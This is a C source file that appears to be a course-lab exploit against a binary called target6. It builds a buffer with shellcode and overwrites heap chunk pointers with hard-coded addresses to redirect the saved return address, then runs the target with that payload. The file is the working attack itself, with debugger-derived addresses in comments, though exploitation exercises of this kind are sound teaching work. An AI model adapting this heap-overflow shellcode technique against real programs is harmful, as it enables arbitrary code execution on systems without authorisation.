#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target6"
#define DEFAULT_BUFFER_SIZE 81
#define RIP_ADDR 72
#define RET_ADDR 76

int main(void)
{
  char *args[3];
  char *env[1];


  // p ->> 0x3021fe98
  // value in p ->> 0x0104ec48 
  // q ->> 0x3021fe90
  // value in q ->> 0x0104ec98 
  // 0x98 - 0x48 = 80 in decimal -> (72 byte + 8 byte chunk tag)

  // rbp 0x3021fea0  
  // rip 0x3021fea8

  char buff[DEFAULT_BUFFER_SIZE];
	int i; 

  // fill with "A"
  for(i = 0; i < DEFAULT_BUFFER_SIZE; i++){
    buff[i] = '\x41';
  }

  // // // p->next
  // unsigned long p_tag_next = 0x0104ec50;
  // buff[0] = p_tag_next & 0xFF;              // Byte 0
	// buff[1] = (p_tag_next >> 8) & 0xFF;   // Byte 1
	// buff[2] = (p_tag_next >> 16) & 0xFF;  // Byte 2
	// buff[3] = (p_tag_next >> 24) & 0xFF;  // Byte 3

  // firstly inject shellcode at begining
  // shellcode
	int iter_shell;
	iter_shell = 0;
	for (i = 8; i < (8 + strlen(shellcode)); i++){
		buff[i] = shellcode[iter_shell]; 
		iter_shell++;
	}

  // 0x3021fe70 rbp
  // buff[72]: the start address of the attack buff
  unsigned long buf_addr = 0x0104ec48;
  // unsigned long buf_addr = 0x0104ec50;
  // Each iteration of the loop copies the 64-bit address into the buffer
	// Copy the address into the buffer, byte by byte, in little-endian order
	buff[0 + RIP_ADDR] = buf_addr & 0xFF;              // Byte 0
	buff[1 + RIP_ADDR] = (buf_addr >> 8) & 0xFF;   // Byte 1
	buff[2 + RIP_ADDR] = (buf_addr >> 16) & 0xFF;  // Byte 2
	buff[3 + RIP_ADDR] = (buf_addr >> 24) & 0xFF;  // Byte 3

  // buff[76]
  unsigned long ret_addr = 0x3021fea8;
  buff[0 + RET_ADDR] = ret_addr & 0xFF;              // Byte 0
	buff[1 + RET_ADDR] = (ret_addr >> 8) & 0xFF;   // Byte 1
	buff[2 + RET_ADDR] = (ret_addr >> 16) & 0xFF;  // Byte 2
	buff[3 + RET_ADDR] = (ret_addr >> 24) & 0xFF;  // Byte 3

  buff[80] = '\0';

  args[0] = TARGET; 
  args[1] = buff; 
  args[2] = NULL;

  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
